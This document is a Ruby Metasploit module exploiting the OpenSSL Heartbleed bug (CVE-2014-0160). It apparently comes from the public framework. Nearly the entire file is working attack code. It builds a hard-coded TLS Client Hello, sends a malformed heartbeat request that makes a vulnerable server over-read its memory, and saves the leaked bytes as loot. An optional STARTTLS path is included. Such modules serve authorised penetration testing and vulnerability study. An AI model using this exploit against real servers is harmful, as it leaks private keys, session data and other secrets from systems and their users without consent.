##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
    'Name'		=> 'OpenSSL Heartbleed Bug',
    'Description'	=> %q{
      The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before
       1.0.1g do not properly handle Heartbeat Extension packets, which
       allows remote attackers to obtain sensitive information from
       process memory via crafted packets that trigger a buffer
       over-read, as demonstrated by reading private keys, related to
       d1_both.c and t1_lib.c, aka the Heartbleed bug.
    },
    'Author'	=>
      [
        'Sebastiano Di Paola <sebastiano.dipaola[at]gmail.com>'
      ],
      'License'		=> MSF_LICENSE,
      'References'	=>
        [
          [ 'CVE', '2014-0160'],
          [ 'URL', 'https://www.openssl.org/news/secadv_20140407.txt']
        ],
      'DisclosureDate' => 'Apr 07 2014'))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('STARTTLS', [false, 'Force to send starttls message', false]),
      ], self.class)
  end

    def run
      # Client Hello TLSv1.1

      hello = "\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02\x53"
      hello << "\x43\x5b\x90\x9d\x9b\x72\x0b\xbc\x0c\xbc\x2b\x92\xa8\x48\x97\xcf"
      hello << "\xbd\x39\x04\xcc\x16\x0a\x85\x03\x90\x9f\x77\x04\x33\xd4\xde\x00"
      hello << "\x00\x66\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39\x00\x38\x00\x88"
      hello << "\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c"
      hello << "\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09"
      hello << "\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44"
      hello << "\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11\xc0\x07\xc0\x0c"
      hello << "\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11"
      hello << "\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00\x49\x00\x0b\x00\x04"
      hello << "\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19"
      hello << "\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08"
      hello << "\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13"
      hello << "\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\x23\x00\x00"
      hello << "\x00\x0f\x00\x01\x01"

      bleed = "\x18\x03\x02\x00\x03\x01\x40\x00"

      begin
        print_status("Connecting to server")
        connect
        
        if datastore['STARTTLS']
          send_starttls(sock)
        end

        print_status("Client Hello")
        sock.put(hello)
        print_status("Client Hello sent")

        while (true)
          type, ver, payload = read_server_messages(sock)
          if type.nil?
            fail_with(Failure::Unknown, "Server closed connection without sending\
             Server Hello.")
            return Exploit::CheckCode::Unknown
          end

          # Look for server hello done message.
          value = payload.unpack('C')
          if type == 0x16 and value[0] == 0x0E
            break
          end
        end

        print_status("Sending heartbeat request...")
        sock.put(bleed)
        vulnerable = check_results(sock)
        disconnect

        if not vulnerable
          return Exploit::CheckCode::Safe
        end

        print_status("Server was heartbleed vulnerable")
        return Exploit::CheckCode::Vulnerable

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        print_error("#{rhost} - Connection failed or interrupted...can't diagnose")
        return Exploit::CheckCode::Unknown
      end

  end

  def read_server_messages(s)
    # get header
    timeout = (datastore['ConnectionTimeout']).to_i
    hdr = s.get_once(5, timeout)
    if hdr.nil?
      fail_with(Failure::TimeoutExpired, "We got a timeout from server..giving up...")
    end
    type, ver, len = hdr.unpack("Cnn")

    payload = s.get_once(len, timeout)
    if payload.nil?
      fail_with(Failure::Unknown, "Got an header but not payload...")
    end
    return type, ver, payload
  end


  def check_results(s)
    while true
      type, ver, payload = read_server_messages(s)
      if type.nil?
          print_status("AAA No heartbeat response received, server likely not vulnerable")
          return false
      end
      if type == 24
        print_status("Received heartbeat response:")
        if payload.length > 3
          # Got a vulnerable one
          report_vuln(
            :host         => rhost,
            :port         => rport,
            :name         => "OpenSSL Heartbeed bug",
            :refs         => self.references,
            :exploited_at => Time.now.utc,
            :info         => "OpenSSL heartbeat information leakage."
          )

          p = store_loot("heartbleed.dump", "binary/hexdump", rhost, payload)
          print_status("heartbleed memory dump saved in: #{p}")
          return true
        else
          print_status("Server processed malformed heartbeat, but did not return any extra data.")
          return false
        end
      end
      if type == 21
        print_status("Received alert message: Server likely not vulnerable")
        return false
      end
    end
  end

  def send_starttls(s)
    timeout = (datastore['ConnectionTimeout']).to_i
    response = sock.get_once(4096, timeout)
    if response.nil?
      fail_with(Failure::TimeoutExpired, 'Unable to get first response from server')
    end
    sock.put('ehlo starttlstest\n')
    response = sock.get_once(1024, timeout)
    if response.nil?
      fail_with(Failure::Unknown, 'Unable to get response to helo from server')
    end
    if not response =~ /STARTTLS/
        fail_with(Failure::Unknown, 'STARTTLS not supported')
    end
    sock.puts('starttls\n')
    response = s.get_once(1024, timeout)
    
    if not response
      fail_with(Failure::Unknown, 'Unable to get response from server')
    end
  end
end
